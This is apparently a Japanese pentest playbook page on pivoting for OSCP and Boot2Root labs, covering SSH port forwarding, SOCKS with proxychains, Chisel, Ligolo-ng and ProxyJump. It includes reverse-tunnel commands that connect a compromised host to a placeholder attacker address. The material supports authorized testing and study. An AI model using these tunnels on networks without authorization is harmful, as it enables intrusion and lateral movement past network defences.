# Pivot（内部ネットワークへの到達）

Pivot は、侵入したホストを踏み台として  
**内部ネットワークの別ホスト・別サービスへアクセスするフェーズ**です。

Boot2Root テンプレートの **Pivot 章の詳細版**として機能します。

---

# 🎯 目的

- 内部ネットワークのサービスへアクセスする  
- 外部から到達できない内部 Web / DB / API を操作する  
- 横展開（Lateral Movement）の突破口を作る  
- OSCP レポートで必要な「内部アクセスの根拠」を整理する  

---

# 📘 目次

1. SSH Local Port Forward  
2. SSH Remote Port Forward  
3. SSH Dynamic Port Forward（SOCKS Proxy）  
4. Chisel（高速・軽量トンネリング）  
5. Ligolo-ng（OSCP で最強の Pivot ツール）  
6. SSH ProxyCommand / ProxyJump  
7. 内部サービスへのアクセス例  
8. Pivot の判断基準  
9. Boot2Root との連携

---

# 1. SSH Local Port Forward（ローカル → 内部）

外部からアクセスできない内部サービスを  
**ローカルに転送してアクセスする方法**。

```
ssh -L 8080:127.0.0.1:8080 user@target
```

### 例
- 内部 Web（8080）  
- 内部 API（5000）  
- 内部 DB（3306 / 5432）  

---

# 2. SSH Remote Port Forward（内部 → 外部）

内部ホストのポートを **攻撃者側へ公開する方法**。

```
ssh -R 9001:127.0.0.1:22 user@target
```

### 使いどころ
- 内部ホストの SSH を外部へ公開  
- 内部 DB を外部へ公開  

---

# 3. SSH Dynamic Port Forward（SOCKS Proxy）

内部ネットワーク全体を **SOCKS プロキシ経由で探索できる**。

```
ssh -D 1080 user@target
```

### 使いどころ
- 内部ネットワークの nmap  
- 内部 Web のブラウズ  
- 内部 API の探索  

### ProxyChains 例
```
proxychains nmap -sV 192.168.1.0/24
```

---

# 4. Chisel（高速・軽量トンネリング）

Chisel は OSCP でよく使われる高速トンネリングツール。

## サーバ（攻撃者側）
```
chisel server -p 9001 --reverse
```

## クライアント（ターゲット側）
```
chisel client <ATTACKER_IP>:9001 R:8080:127.0.0.1:8080
```

### 使いどころ
- 内部 Web の転送  
- 内部 DB の転送  
- SSH の転送  

---

# 5. Ligolo-ng（OSCP 最強の Pivot ツール）

Ligolo-ng は OSCP で最も使われる Pivot ツール。

## 攻撃者側
```
ligolo-proxy -selfcert
```

## ターゲット側
```
agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

### 使いどころ
- 内部ネットワーク全体の探索  
- 内部 Web / DB / API のアクセス  
- 複数ホストの横展開  

---

# 6. SSH ProxyCommand / ProxyJump

内部ホストへ SSH で直接横展開する方法。

## ProxyJump
```
ssh -J user@pivot user@internal-host
```

## ProxyCommand
```
ssh -o ProxyCommand="ssh -W %h:%p user@pivot" user@internal-host
```

---

# 7. 内部サービスへのアクセス例

### 内部 Web（8080）
```
curl http://127.0.0.1:8080
```

### 内部 DB（3306）
```
mysql -h 127.0.0.1 -u root -p
```

### 内部 API（5000）
```
curl http://127.0.0.1:5000/api
```

---

# 8. Pivot の判断基準

Pivot が必要かどうかは Internal Enumeration の結果で判断する。

### Pivot が必要なケース
- 内部 Web が存在する  
- 内部 DB が存在する  
- 内部 API が存在する  
- 内部ホストへ SSH したい  
- 内部ネットワークをスキャンしたい  

### Pivot が不要なケース
- 外部から直接アクセスできる  
- すでに内部ホストへ SSH できる  

---

# 9. Boot2Root との連携

Boot2Root の Pivot 章は軽量化されており、  
詳細はこのページにリンクされます。

Boot2Root の流れ：

```
Internal Enumeration
↓
Pivot
↓
Lateral Movement
```

そのため、Boot2Root では結果だけ記録し、  
技術的な深掘りは Pentest-Playbook の Pivot に集約します。

---

# 🎯 この章の目的

- Pivot の技術体系を 1ページに集約  
- Boot2Root の軽量テンプレートと連携  
- OSCP レポート品質の情報整理  
- 将来の構造変更にも強い設計  
